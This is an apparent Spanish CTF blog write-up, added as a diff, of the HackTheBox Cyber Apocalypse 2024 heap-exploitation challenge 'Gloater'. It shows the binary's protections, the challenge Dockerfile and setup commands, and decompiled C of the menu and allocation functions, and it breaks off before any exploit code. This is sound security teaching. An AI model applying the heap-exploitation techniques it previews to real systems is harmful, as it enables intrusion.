@@ -1,0 +1,693 @@
+<!doctype html><html lang="es"><head><title>Gloater | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="HTB CA 2024. Binario de 64 bits. Explotación del _heap_. _House of Spirit_. _Chunks_ solapados. Tcache _poisoning_. TLS-storage `dtor_list`"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2024. Binario de 64 bits. Explotación del _heap_. _House of Spirit_. _Chunks_ solapados. Tcache _poisoning_. TLS-storage `dtor_list`"><meta itemprop="keywords" content><meta itemprop="name" content="Gloater"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="HTB CA 2024. Binario de 64 bits. Explotación del _heap_. _House of Spirit_. _Chunks_ solapados. Tcache _poisoning_. TLS-storage `dtor_list`"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Gloater"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/gloater/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="HTB CA 2024. Binario de 64 bits. Explotación del _heap_. _House of Spirit_. _Chunks_ solapados. Tcache _poisoning_. TLS-storage `dtor_list`"><meta name="twitter:description" content="HTB CA 2024. Binario de 64 bits. Explotación del _heap_. _House of Spirit_. _Chunks_ solapados. Tcache _poisoning_. TLS-storage `dtor_list`"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Gloater"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/gloater/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/htb-cyber-apocalypse/gloater/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/gloater/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/gloater/&amp;text=Gloater" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/gloater/&amp;title=Gloater" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Gloater</h1><p class="mb4 f6 dib tracked">16 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#otras-funciones">Otras funciones</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>gloater</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
+RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
+Stack:    <span class="code-dark-green">Canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
+RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+</code></pre></div><p>También se nos proporciona un <code>Dockerfile</code> con la configuración del contenedor:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> ubuntu:20.04</span>
+<span class="mtk5">ENV</span><span class="mtk1"> DEBIAN_FRONTEND noninteractive</span>
+
+<span class="mtk5">RUN</span><span class="mtk1"> apt-get update --fix-missing &amp;&amp; apt-get -y upgrad</span><span class="mtk1">e</span>  
+<span class="mtk5">RUN</span><span class="mtk1"> apt-get install -y socat</span>
+
+<span class="mtk5">RUN</span><span class="mtk1"> useradd -m ctf</span>
+
+<span class="mtk5">COPY</span><span class="mtk1"> challenge/* /home/ctf/</span>
+
+<span class="mtk5">RUN</span><span class="mtk1"> chown -R ctf:ctf /home/ctf/</span>
+
+<span class="mtk5">WORKDIR</span><span class="mtk1"> /home/ctf</span>
+<span class="mtk3">#USER ctf</span>
+
+<span class="mtk5">EXPOSE</span><span class="mtk1"> 9001</span>
+<span class="mtk5">CMD</span><span class="mtk1"> [</span><span class="mtk4">"./run.sh"</span><span class="mtk1">]</span>
+</code></pre></div><p>Podemos ver que el programa se ejecuta en Ubuntu 20.04, por lo que usará Glibc 2.31. Podemos iniciar el contenedor y tomar <code>libc.so.6</code> desde dentro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> build --tag=gloater <span class="mtku">.</span>
+[+] Building 5.3s (12/12) FINISHED                                                                                                             docker:default
+<span class="code-dark-blue"> =&gt; [internal] load build definition from Dockerfile                                                                                                     0.0s</span>
+<span class="code-dark-blue"> =&gt; =&gt; transferring dockerfile: 318B                                                                                                                     0.0s</span>  
+<span class="code-dark-blue"> =&gt; [internal] load metadata for docker.io/library/ubuntu:20.04                                                                                          0.7s</span>
+<span class="code-dark-blue"> =&gt; [internal] load .dockerignore                                                                                                                        0.0s</span>
+<span class="code-dark-blue"> =&gt; =&gt; transferring context: 2B                                                                                                                          0.0s</span>
+<span class="code-dark-blue"> =&gt; [1/7] FROM docker.io/library/ubuntu:20.04@sha256:80ef4a44043dec4490506e6cc4289eeda2d106a70148b74b5ae91ee670e9c35d                                    0.0s</span>
+<span class="code-dark-blue"> =&gt; [internal] load build context                                                                                                                        0.0s</span>
+<span class="code-dark-blue"> =&gt; =&gt; transferring context: 21.86kB                                                                                                                     0.0s</span>
+<span class="code-dark-blue"> =&gt; CACHED [2/7] RUN apt-get update --fix-missing && apt-get -y upgrade                                                                                  0.0s</span>
+<span class="code-dark-blue"> =&gt; [3/7] RUN apt-get install -y socat                                                                                                                   3.7s</span>
+<span class="code-dark-blue"> =&gt; [4/7] RUN useradd -m ctf                                                                                                                             0.4s</span>
+<span class="code-dark-blue"> =&gt; [5/7] COPY challenge/* /home/ctf/                                                                                                                    0.0s</span>
+<span class="code-dark-blue"> =&gt; [6/7] RUN chown -R ctf:ctf /home/ctf/                                                                                                                0.3s</span>
+<span class="code-dark-blue"> =&gt; [7/7] WORKDIR /home/ctf                                                                                                                              0.1s</span>
+<span class="code-dark-blue"> =&gt; exporting to image                                                                                                                                   0.1s</span>
+<span class="code-dark-blue"> =&gt; =&gt; exporting layers                                                                                                                                  0.1s</span>
+<span class="code-dark-blue"> =&gt; =&gt; writing image sha256:160391a668cdd71f3c4d464f323b68fa8fe51ff1e6582ac20971348e7daeb079                                                             0.0s</span>
+<span class="code-dark-blue"> =&gt; =&gt; naming to docker.io/library/gloater                                                                                                               0.0s</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it -p 9001:9001 --rm --name=gloater -d <span class="mtku">gloater</span>
+4f9e9d6840a1026b36dea1ba4575be9baa8f22edc051f52b5ba2180bca2cc0a8
+
+<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> cp -L 4f9e9d68:/lib/x86_64-linux-gnu/libc.so.6 <span class="mtku">.</span>
+Successfully copied 2.03MB to ./.
+</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Podemos usar Ghidra para analizar el binario y mirar el código fuente descompilado en C. Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> stack_buffer[</span><span class="mtk6">136</span><span class="mtk1">];</span>
+
+<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
+<span class="mtk1">  libc_start </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">92e50</span><span class="mtk1">;</span>
+<span class="mtk1">  libc_end </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">268e50</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter User</span><span class="mtk6">\n</span><span class="mtk4">Do not make a mistake, or there will be no safegua</span><span class="mtk4">rd!</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, user, </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
+
+<span class="mtk1">  option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"1) Update current user</span><span class="mtk6">\n</span><span class="mtk4">2) Create new taunt</span><span class="mtk6">\n</span><span class="mtk4">3) Remove taunt</span><span class="mtk6">\n</span><span class="mtk4">4) Send all taunts</span><span class="mtk6">\n</span><span class="mtk4">5) Set Super Taunt</span><span class="mtk6">\n</span><span class="mtk4">6) Exit</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>  
+<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">option);</span>
+<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (option) {</span>
+<span class="mtk1">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
+<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">change_user</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">create_taunt</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">remove_taunt</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">send_taunts</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">set_super_taunt</span><span class="mtk1">(stack_buffer);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Básicamente, muestra un menú típico desde un reto de explotación del <em>heap</em> (después de establecer un nombre de usuario):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 127.0.0.1 9001
+Enter User
+Do not make a mistake, or there will be no safeguard!  
+&gt; asdf
+1) Update current user
+2) Create new taunt
+3) Remove taunt
+4) Send all taunts
+5) Set Super Taunt
+6) Exit
+&gt;
+</code></pre></div><h3 id="función-de-asignación">Función de asignación</h3><p>Esta es <code>create_taunt</code> (opción <code>2</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">create_taunt</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> length;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_taunt;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> c;</span>
+<span class="mtk1">  undefined taunt[</span><span class="mtk6">1028</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> _length;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">taunt_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_taunt_struct;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (taunt_count </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) {</span>
+<span class="mtk1">    p_taunt_struct </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">taunt_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(p_taunt_struct, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Taunt target: "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, p_taunt_struct-&gt;target, </span><span class="mtk5">0x</span><span class="mtk6">1f</span><span class="mtk1">);</span>
+<span class="mtk1">    ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(p_taunt_struct-&gt;target, user);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"DANGER: You entered yourself"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bet you</span><span class="mtk6">\'</span><span class="mtk4">re glad you paid attention initially, eh?"</span><span class="mtk1">);</span>  
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Next time, you won</span><span class="mtk6">\'</span><span class="mtk4">t be so lucky."</span><span class="mtk1">);</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk8">memset</span><span class="mtk1">(taunt, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1024</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Taunt: "</span><span class="mtk1">);</span>
+<span class="mtk1">      length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, taunt, </span><span class="mtk6">1023</span><span class="mtk1">);</span>
+<span class="mtk1">      _length </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) length;</span>
+<span class="mtk1">      p_taunt </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">((</span><span class="mtk7 mtki">long</span><span class="mtk1">) _length);</span>
+<span class="mtk1">      p_taunt_struct-&gt;taunt </span><span class="mtk5">=</span><span class="mtk1"> p_taunt;</span>
+<span class="mtk1">      </span><span class="mtk8">memset</span><span class="mtk1">(p_taunt_struct, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">memcpy</span><span class="mtk1">(p_taunt_struct-&gt;taunt, taunt, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) _length);</span>
+<span class="mtk1">      c </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) taunt_count;</span>
+<span class="mtk1">      taunt_count </span><span class="mtk5">=</span><span class="mtk1"> taunt_count </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">      taunts[c] </span><span class="mtk5">=</span><span class="mtk1"> p_taunt_struct;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Cannot taunt more. You must risk it again."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Para mejorar la legibilidad, configuré la siguiente <code>struct</code> después de comprender los campos que lee el programa:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> target[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">];  </span>  
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> taunt;</span>
+<span class="mtk1">} </span><span class="mtk8 mtku">taunt_t</span><span class="mtk1">;</span>
